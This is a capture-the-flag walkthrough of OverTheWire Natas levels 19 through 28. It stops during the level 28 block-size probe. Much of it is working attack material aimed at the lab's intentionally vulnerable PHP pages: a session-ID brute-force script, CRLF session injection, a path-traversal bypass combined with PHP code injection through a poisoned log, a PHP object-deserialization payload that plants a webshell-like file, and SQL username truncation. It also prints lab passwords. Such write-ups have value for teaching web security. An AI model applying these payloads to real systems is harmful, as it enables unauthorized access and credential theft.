So we explore the cookie `PHPSESSID` in the response with username=hoangp46&password=123456

```
POST /index.php HTTP/1.1
Host: natas19.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas19.natas.labs.overthewire.org/index.php?debug=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://natas19.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==
Connection: keep-alive
Cookie: __utma=176859643.1954634464.1645363414.1646410345.1646492867.10; __utmz=176859643.1646492867.10.6.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=3237332d686f616e67703436
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

The cookie `PHPSESSID=3237332d686f616e67703436` look like HEX format, try decode it we get `273-hoangp46` -> now we can brute-force to find the PHPSESSID of admin with payload `HEX(§640§-admin)`. This following python code `natas19.py`:

```python
import requests

url = "http://natas19.natas.labs.overthewire.org"
auth_username = "natas19"
auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

for i in range(641):
    cookie = '{}-admin'.format(i).encode().hex()
    r = requests.get(url, auth=(auth_username, auth_password), cookies={'PHPSESSID': cookie})
    if i == 0:
        request_length = len(r.content)
    if len(r.content) != request_length:
        print('admin id:', i, 'cookie:', cookie)
        break
    request_length = len(r.content)
```

```
python3 natas19.py

admin id: 281 cookie: 3238312d61646d696e
```

Using `curl` to set cookie `PHPSESSID=3238312d61646d696e`:

```shell
curl --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org --cookie "PHPSESSID=3238312d61646d696e"
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

### natas20

```php
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

```

When we change name to `hoang` and add parameter `?debug=1` into url, the response look like that:

```
DEBUG: MYREAD 43gs6u90l9seoufajpsn97ag44
DEBUG: Reading from /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: Read [name hoang]
DEBUG: Read []
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.

DEBUG: MYWRITE 43gs6u90l9seoufajpsn97ag44 name|s:5:"hoang";
DEBUG: Saving in /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: name => hoang
```

If we want to login as an admin, we need to set `$_SESSION["admin"]=1` in `print_credentials()` function.

Following `mywrite()` function, this function write data in `$_SESSION` into session_file, each key value pairs on one line:

```php
foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
```

Following `myread()` function, this function read data from session_file, and set key value pairs to `$_SESSION`:

```php
foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
```

The content of session_file of admin look like that:

```
name hoang
admin 1
```

We will inject payload to change name and write `admin 1` line into session_file. That is `CRLF injection` with the payload `hoang%0Aadmin%201`

Try access url: `http://natas20.natas.labs.overthewire.org/?name=hoang%0Aadmin%201&debug=1`

Refresh browser to reload `myread()` function, you can see password:

```
DEBUG: MYREAD 43gs6u90l9seoufajpsn97ag44
DEBUG: Reading from /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: Read [name hoang]
DEBUG: Read [admin 1]
DEBUG: Read []
DEBUG: Name set to hoang admin 1
You are an admin. The credentials for the next level are:

Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

DEBUG: MYWRITE 43gs6u90l9seoufajpsn97ag44 name|s:13:"hoang admin 1";admin|s:1:"1";
DEBUG: Saving in /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: admin => 1
DEBUG: name => hoang admin 1
```

### natas21

```php
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?> 
```

```php
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
        } 
    else {
        $_SESSION[$key] = $val;
        }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?> 
```

The application save key value pairs from `$_REQUEST` to `$_SESSION` by:

```php
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

Login as an admin required `$_SESSION["admin"] == 1` -> `$_REQUEST["admin"] == 1`

Custom input form to `<input name="admin" value="1">` -> POST -> get response with parameter `?debug`:

```
[DEBUG] Session contents:
Array ( [align] => center [fontsize] => 100% [bgcolor] => yellow [admin] => 1 [submit] => Update )
```

Oh, `[admin] => 1` is should be ok, let's see the response:

```
GET /index.php?debug HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
Connection: keep-alive
Cookie: __utma=176859643.1954634464.1645363414.1646503128.1646533829.12; __utmz=176859643.1646533829.12.8.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=2tfpv93p619l71uffvd1675uh5
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Get cookie `PHPSESSID=2tfpv93p619l71uffvd1675uh5` and POST to http://natas21.natas.labs.overthewire.org/index.php:

```shell
curl --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/index.php --cookie "PHPSESSID=2tfpv93p619l71uffvd1675uh5"
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

### natas22

```php
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?> 
```

In the browser, try access: http://natas22.natas.labs.overthewire.org/?revelio to get password. But it's nothing???

Because `header("Location: /");` in source code, the browser redirect to root page (/), Let's use `curl`:

```sh
curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

### natas23

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

In PHP, we can compare between string and int, string will be convert to int, such as: `"abc"->0`, `"123abc->123` or `"10e1xyz"->100`. So the passwd payload `123iloveyou` is should be ok.

```
The credentials for the next level are:

Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

### natas24

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 
```

In PHP, `strcmp` is used to compare two string. If two string equal, the `strcmp` return to 0.

We want `strcmp` return to 0. It will happen if passwd will be a string equals to which is unknown. The other case is that passwd won't be a string, the function will return `NULL` (equal 0) and raise Warning, such as below:

```
strcmp("foo", array()) => NULL + PHP Warning
strcmp("foo", new stdClass) => NULL + PHP Warning
strcmp(function(){}, "") => NULL + PHP Warning
```

Let's pass `passwd` as array with the payload `?passwd[]=`:

```
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23

The credentials for the next level are:

Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

The application allow us to change language by `setLanguage()` function.

When `setLanguage()`, the function `safeinclude()` is running to include another file.

The function `safeinclude()` replace `"../"` by `""` to avoid path traversal injection, but we can bypass by using payload `..././`.

Try access: http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././etc/passwd, we can see the response:

```
...
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync
```

The function `logRequest()` dump `$_SERVER['HTTP_USER_AGENT']` and `$message` into file `/var/www/natas/natas25/logs/natas25_{PHPSESSID}.log`. So we can inject php code into `$_SERVER['HTTP_USER_AGENT']` by custom Header User-Agent.

Explore the Cookie, we have `PHPSESSID=eaufuovudsaosoirjmihb93j66`,

Try access http://natas25.natas.labs.overthewire.org/?lang=..././logs/natas25_eaufuovudsaosoirjmihb93j66.log, we get log look like that:

```
[06.03.2022 20::19:41] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::19:46] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::20:48] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::21:21] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::22:29] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." 
```

Change `User-Agent` header to: `<?php echo file_get_contents("/etc/natas_webpass/natas26");?>`, the password of natas26 will be written to the log file. See log and get password `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`.

### natas26

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>
```

Try `POST` form with random `X1`, `X2`, `X3`, `X4` value, get the response:

```
Host: natas26.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas26.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA==
Connection: keep-alive
Cookie: __utma=176859643.1954634464.1645363414.1646503128.1646533829.12; __utmz=176859643.1646533829.12.8.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=qkur9poeu2jlnno2nko2rbk937; drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Explore the cookie:

`drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D`

In source code, the cookie `drawing` is set by `setcookie("drawing",base64_encode(serialize($drawing)));`. Ok, we can unserialize it.

First, base_64 decode:

`a:1:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:2:"10";s:2:"y2";s:2:"10";}}`

Then, unserialize:

` Array ( [0] => Array ( [x1] => 10 [y1] => 10 [x2] => 10 [y2] => 10 ) ) `

In source code, the class `Logger` do not used. Now we create `Logger` object by `natas26.php`, next serialize and base64 encode, then inject to cookie.

```php
<?php
// natas26.php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct()
    {
        // initialise variables
        $this->initMsg="BEGIN PASSWORD \n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?> \n END PASSWORD";
        $this->logFile = "img/test.php";
    }
}
$object = new Logger();
echo base64_encode(serialize($object));
?>
```

The above codes creates an object of class `Logger`. Creation of an object sends a call to `__construct()` function which executes our command and stores the result in img/test.php file.

```shell
php natas26.php

Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTY6IkJFR0lOIFBBU1NXT1JEIAoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo3NjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiAKIEVORCBQQVNTV09SRCI7fQ==
```

Change cookie `drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTY6IkJFR0lOIFBBU1NXT1JEIAoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo3NjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiAKIEVORCBQQVNTV09SRCI7fQ==`

Access to `http://natas26.natas.labs.overthewire.org/img/test.php` and get password:

```
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ END PASSWORD
```

### natas27

```php
<?

// morla / 10111
// database gets cleared every 5 min 


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){
 
    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!  
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
?> 
```

First, I tried bypass `mysql_real_escape_string()` function by following http://server1.sharewiz.net/doku.php?id=sql_injection_-_example_attacks:sql_injection_that_gets_around_mysql_real_escape_string, but is doesn't work!

Then, I focused on the comment section of the source code:

```php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
```

The max username length is 64, and the length of `natas28` is 7. Now we are going to pad to `natas28` with 57 blank space follow by a random string look like that `natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++abcxyz`. 

The username that we created is longer than 64, SQL will automatically truncate the string so that the string is only 64. That is `natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++` equal `natas28`.

Concluding, the payload is `natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++abcxyz`

```
Welcome natas28 !
Here is your data:
Array ( [username] => natas28 [password] => 
JWwR438wkgTsNKBbcJoowyysdM82YjeF ) 
```

### natas28

When I search with fixed value `query=a`, the response generate random 3 sentences (maybe `LIMIT 3` in SQL), look like that:

```
Whack Computer Joke Database

    Q: How many programmers does it take to change a light bulb?
    A: None. It's a hardware problem.
    There are 10 kinds of people in the world: Those that know binary & those that don't
    Q: What is a computer virus?
    A: A terminal illness!
```

Try search with another query value, such as: `query=aaaaa`, we don't have anything in the response. Maybe there is no `aaaaa` string in the SQL databse.

Try repeat search with unique query value, such as: `query=illness`, we have only 1 sentence:

```
Q: What is a computer virus?
A: A terminal illness!
```

Hmm, maybe this challenge used query `SELECT joke from database WHERE joke LIKE '%<input>%'` and show result in browser. This query will finds any values that have "<input>" in any position. So we can use `UNION` operator to combine the result-set of two `SELECT` statements, one is my SQL injection.


But the parameter in URL `?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D` look like cipher based base64 encode.

If I remove some characters in parameter `query`, I got the following error: `Incorrect amount of PKCS#7 padding for blocksize` -> this is invalid paddding in block cipher, read [ECB](https://github.com/hoangph3/web-security/blob/main/crypto/README.md) first.

First, we need brute-force to find block size.

```python
#!/usr/bin/python3
import requests
from urllib.parse import urlparse, unquote

url = "http://natas28.natas.labs.overthewire.org/index.php"
auth_username = "natas28"
auth_password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

text = 'a'

while len(text) < 50:
    data = {"query": text}
    r = requests.post(url, data=data, auth=(auth_username,auth_password))
    print("len:{}\tcipher:{}".format(len(text), unquote(r.url.split('=')[-1])))
    text += 'a'
```

```
len:1   cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
len:2   cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
...
len:11  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
len:12  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
len:13  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
len:14  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
...
len:27  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
len:28  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO/KQD0d1/VBE/QY9Jva7f3NLQciZ
len:29  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12/MXUZMaiIebtmORiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
len:30  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo+zTb4/ZFk1ANUDkSXB9J+VCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
...
